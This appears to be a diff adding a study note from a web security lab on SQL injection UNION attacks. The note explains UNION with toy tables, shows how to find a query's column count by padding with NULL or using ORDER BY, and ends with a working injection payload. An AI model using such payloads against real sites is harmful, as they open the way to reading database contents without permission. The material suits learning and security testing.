@@ -1,0 +1,92 @@
+#+title: SQL injection UNION attack, determining the number of columns returned by the query
+
+
+* About
+sql injection into product ~category~ filter
+
+** End Goal
+use sql injection ~UNION~ attack to determine the number of columns returned by the query
+
+* UNION in sql
+~UNION~ is used to combine the result-set of two or more ~SELECT~ statements
+
++ users
++-----+-----+-----+-----+-----+
+|  username  |   password     |
++-----+-----+-----+-----+-----+
+|  admin     |   admin        |
++-----+-----+-----+-----+-----+
+|  smith     |   pass12345    |
++-----+-----+-----+-----+-----+
+
+
++ product
++------------+------------+
+|  itemName  |    price   |
++------------+------------+
+|  pen       |    10      |
++------------+------------+
+|  paper     |    20      |
++------------+------------+
+
+** Sample Query
+#+begin_src sql
+SELECT username, password FROM users
+#+end_src
+
+** output
+
++-----+-----+-----+-----+-----+
+|  admin     |   admin        |
++-----+-----+-----+-----+-----+
+|  smith     |   pass12345    |
++-----+-----+-----+-----+-----+
+
+** Query with UNION
+#+begin_src sql
+SELECT username, password FROM users UNION SELECT itemName,price FROM product
+#+end_src
+
+** output
+
++-----+-----+-----+-----+-----+
+|  admin     |   admin        |
++-----+-----+-----+-----+-----+
+|  smith     |   pass12345    |
++-----+-----+-----+-----+-----+
+|   pen      |    10          |
++-----+-----+-----+-----+-----+
+|   paper    |    20          |
++-----+-----+-----+-----+-----+
+
+** Some rule for UNION to work
+
++ Every ~SELECT~ statement within ~UNION~ must have the same number of columns
++ Same data types in columns
++ Same order in the columns in every ~SELECT~ statement
+
+* Figure out
+We have to figure out the correct number of columns first
+
+** way 1
+~dummy query~
+#+begin_src sql
+SELECT something FROM users UNION SELECT NULL
+#+end_src
+~error => incorrect number of columns~
+users table has two columns
+
+#+begin_src sql
+SELECT something FROM users UNION SELECT NULL,NULL
+#+end_src
+~200 response code => correct number columns~
+
+** way 2
+#+begin_src sql
+SELECT something FROM users order by 2
+#+end_src
+
+* Solution
+#+begin_src sql
+'UNION SELECT NULL,NULL,NULL --
+#+end_src
